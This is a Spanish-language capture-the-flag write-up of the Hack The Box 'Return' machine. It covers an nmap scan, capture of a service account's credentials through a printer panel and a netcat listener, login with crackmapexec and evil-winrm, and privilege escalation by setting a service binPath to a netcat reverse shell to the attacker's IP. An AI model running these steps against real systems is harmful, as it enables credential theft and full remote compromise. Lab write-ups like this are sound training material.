# Return-HTB

## NMAP

```ruby
   │ # Nmap 7.94SVN scan initiated Tue Mar 12 23:31:16 2024 as: nmap -sVC -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49673,49674,49675,49676,49679,49694 -oN Scan 10.129.247.90
   2   │ Nmap scan report for 10.129.247.90
   3   │ Host is up (0.16s latency).
   4   │ 
   5   │ PORT      STATE SERVICE       VERSION
   6   │ 53/tcp    open  domain        Simple DNS Plus
   7   │ 80/tcp    open  http          Microsoft IIS httpd 10.0
   8   │ | http-methods: 
   9   │ |_  Potentially risky methods: TRACE
  10   │ |_http-server-header: Microsoft-IIS/10.0
  11   │ |_http-title: HTB Printer Admin Panel
  12   │ 88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-03-13 03:50:02Z)
  13   │ 135/tcp   open  msrpc         Microsoft Windows RPC
  14   │ 139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
  15   │ 389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
  16   │ 445/tcp   open  microsoft-ds?
  17   │ 464/tcp   open  kpasswd5?
  18   │ 593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
  19   │ 636/tcp   open  tcpwrapped
  20   │ 3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
  21   │ 3269/tcp  open  tcpwrapped
  22   │ 5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
  23   │ |_http-title: Not Found
  24   │ |_http-server-header: Microsoft-HTTPAPI/2.0
  25   │ 9389/tcp  open  mc-nmf        .NET Message Framing
  26   │ 47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
  27   │ |_http-server-header: Microsoft-HTTPAPI/2.0
  28   │ |_http-title: Not Found
  29   │ 49664/tcp open  msrpc         Microsoft Windows RPC
  30   │ 49665/tcp open  msrpc         Microsoft Windows RPC
  31   │ 49666/tcp open  msrpc         Microsoft Windows RPC
  32   │ 49667/tcp open  msrpc         Microsoft Windows RPC
  33   │ 49673/tcp open  msrpc         Microsoft Windows RPC
  34   │ 49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
  35   │ 49675/tcp open  msrpc         Microsoft Windows RPC
  36   │ 49676/tcp open  msrpc         Microsoft Windows RPC
  37   │ 49679/tcp open  msrpc         Microsoft Windows RPC
  38   │ 49694/tcp open  msrpc         Microsoft Windows RPC
  39   │ Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows
  40   │ 
  41   │ Host script results:
  42   │ | smb2-security-mode: 
  43   │ |   3:1:1: 
  44   │ |_    Message signing enabled and required
  45   │ | smb2-time: 
  46   │ |   date: 2024-03-13T03:51:02
  47   │ |_  start_date: N/A
  48   │ |_clock-skew: 18m35s
  49   │ 
  50   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  51   │ # Nmap done at Tue Mar 12 23:32:39 2024 -- 1 IP address (1 host up) scanned in 82.40 seconds


```

Desde aqui ya te das cuenta que es un AD primer paso conseguir credenciales validas.

![image](https://github.com/gecr07/Return-HTB/assets/63270579/5294ce5e-4b5f-41ca-84e1-f68ed839302a)

Para ver si aluna conexion llega SIEMPRE el nc

```
nc -lvnp 389

```

Lo que nos da ya un usuario valido y la contraseña.

```
connect to [10.10.14.146] from (UNKNOWN) [10.129.247.90] 62505
0*`%return\svc-printer
                      1edFg43012!!


```

Probamos que el usuario y pass sea valido. Y ademas checamos el winrm que vemos que tenemos el puerto abierto

```
crackmapexec smb 10.129.247.90 -u 'svc-printer' -p '1edFg43012!!'

crackmapexec winrm 10.129.247.90 -u 'svc-printer' -p '1edFg43012!!' 

```

Si nos pone P0wned entonces tenemos posibilidad de entrar por Winrm.

```
evil-winrm -u 'svc-printer' -p '1edFg43012!!' -i 10.129.95.241 
```

## Prives

Entro a la maquina intento enumerar y me doy cuenta queno hay mucho sin embargo este usuario pertenece al grupo priviligeado de Server Operators el cual tiene entre muchas capacidades la de manipular servicios por  lo que vamos  ponerle nuestro nc

```
sc.exe config VMTools binPath="C:\Windows\Temp\privesc\nc64.exe -e cmd.exe 10.10.14.146"
sc.exe stop VMTools
sc.exe start VMTools

```





















































